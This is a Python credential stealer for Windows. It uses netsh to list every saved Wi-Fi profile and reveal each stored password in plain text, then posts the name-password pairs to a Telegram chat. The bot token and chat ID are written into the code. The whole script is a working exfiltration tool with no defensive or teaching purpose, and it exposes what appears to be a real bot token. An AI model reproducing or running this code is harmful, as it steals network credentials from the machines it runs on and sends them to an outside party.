import subprocess
import requests

# get token and chat_id
Bot_token = '6989989159:AAGj_44mqExEf6FYEEzECqiItZUYe4uX_4I'
chat = "6228676277"

# send information to telegram
def send(data, Bot_token, chat):
    url = f"https://api.telegram.org/bot{Bot_token}/sendMessage"
    params = {
        'chat_id': chat,
        'text': data
    }
    requests.post(url, params=params)

# get wifi name and decode
def get_wifi_profiles():
    meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
    data = meta_data.decode("utf-8")
    data = data.split("\n")
    names = []

    for line in data:
        if "All User Profile     : " in line:
            name = line.split(":")[1].strip()
            names.append(name)
    return names

# get wifi password and send as name ==> password
wifi_details = ""
for name in get_wifi_profiles():
    try:
        meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', name, 'key=clear'])
        data = meta_data.decode("utf-8", errors="backslashreplace")
        data = data.split("\n")

        password = None
        for line in data:
            if "Key Content" in line:
                password = line.split(":")[1].strip()
                wifi_details += f"{name} ==> {password}\n\n"
    except subprocess.CalledProcessError as e:
        wifi_details += f"Error retrieving password for {name}: {e}\n\n"

if wifi_details:
    send(wifi_details, Bot_token, chat)